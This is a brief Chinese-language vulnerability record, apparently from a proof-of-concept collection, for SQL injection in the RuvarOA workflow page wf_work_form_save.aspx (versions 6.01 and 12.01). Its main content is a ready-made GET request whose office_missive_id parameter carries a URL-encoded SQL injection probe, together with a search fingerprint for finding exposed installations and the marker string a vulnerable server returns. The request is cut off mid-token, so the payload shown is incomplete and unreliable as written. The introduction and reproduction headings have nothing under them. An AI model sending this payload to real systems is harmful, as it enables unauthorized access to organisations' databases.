# RuvarOAwf_work_form_save存在SQL注入漏洞

- **系统**：RuvarOAwf　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="txt_admin_key"`
- **请求**：`GET /WorkFlow/wf_work_form_save.aspx?office_missive_id=%28SELECT+CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%288593%3D8593%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHA`

**请求体 / payload**
```
qxvkq1qbzpq
```

**其他**
- RuvarOA wf\_work\_form\_save存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * RuvarOA v6.01
* RuvarOA v12.01